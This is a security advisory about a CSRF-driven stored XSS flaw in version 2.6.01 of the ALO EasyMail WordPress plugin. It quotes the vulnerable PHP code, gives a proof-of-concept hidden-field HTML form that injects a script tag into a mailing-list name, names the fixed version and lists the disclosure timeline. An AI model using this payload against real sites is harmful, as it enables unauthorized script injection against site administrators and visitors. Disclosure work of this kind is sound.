# Affected Version: 2.6.01
# Exploit Author: Mohsen Lotfi
# Contact: mohsen.lotfi.all@gmail.com
# Twitter: fox_one_fox_one
# Date: 01-16-2016
 
#####################
1. Description
#####################
 
The plugin contains a CSRF vulnerability, which can be exploited to perform a script insertion attack.
 
script insertion happens in wp-content/plugins/alo-easymail/pages/alo-easymail-admin-options.php : 
 
                case "save_list":   // SAVE a mailing list (add or update)
            if ( isset($_REQUEST[&#039;submit_list&#039;]) ) {
                //$list_name = stripslashes( trim( $_POST[&#039;elp_list_name&#039;] ) );
                 
                // List name    
                $list_name  = array();
                foreach ( $languages as $key => $lang ) {
                    if (isset($_POST[&#039;listname_&#039;.$lang]) )  $list_name[$lang] = stripslashes(trim($_POST[&#039;listname_&#039;.$lang]));        /* script insertion here */
                }
                 
                $list_available = stripslashes( trim( $_POST[&#039;elp_list_available&#039;] ) );
                $list_order = stripslashes( trim( $_POST[&#039;elp_list_order&#039;] ) );
                if ( $list_name && $list_available && is_numeric($list_order) ) {
                    $mailinglists = alo_em_get_mailinglists ( &#039;hidden,admin,public&#039; );
                    if ( $list_id )  { // update
                        $mailinglists [$list_id] = array ( "name" => $list_name, "available" => $list_available, "order" => $list_order );
                    } else { // or add a new
                        if ( empty($mailinglists) ) { // if 1st list, skip index 0
                            $mailinglists [] = array ( "name" => "not-used", "available" => "deleted", "order" => "");
                        }   
                        $mailinglists [] = array ( "name" => $list_name, "available" => $list_available, "order" => $list_order);
                    }
                    if ( alo_em_save_mailinglists ( $mailinglists ) ) {
                        unset ( $list_id );
                        unset ( $list_name );
                        unset ( $list_available );                      
                        unset ( $list_order );  
                        echo &#039;<div id="message" class="updated fade"><p>&#039;. __("Updated", "alo-easymail") .&#039;</p></div>&#039;;
                    } else {
                        echo &#039;<div id="message" class="error"><p>&#039;. __("Error during operation.", "alo-easymail") .&#039;</p></div>&#039;;
                    }
                } else {
                    echo &#039;<div id="message" class="error"><p>&#039;. __("Inputs are incompled or wrong. Please check and try again.", "alo-easymail") .&#039;</p></div>&#039;;
                }
            }   
            break;
 
 
#####################
2. Proof of Concept
#####################
  
Login as regular user then:
  
    <input type="hidden" name="listname_en" value="<script>alert(&#039;xss&#039;)</script>">
    <input type="hidden" name="elp_list_available" value="hidden">
    <input type="hidden" name="elp_list_order" value="0">
    <input type="hidden" name="user_ID" value="1">
    <input type="hidden" name="task" value="save_list">
    <input type="hidden" name="list_id" value="">
    <input type="submit" name="submit_list" value="Trigger!">
</form>
 
 
#####################
3. Sulotion
#####################
    
Update to version 2.7.0
 
#####################
4. Report Timeline
#####################
 
01-16-2016 : Vulnerability discovered.
01-25-2016 : Vendor notified of vulnerability.
02-07-2016 : Vendor replied and released fixed version.

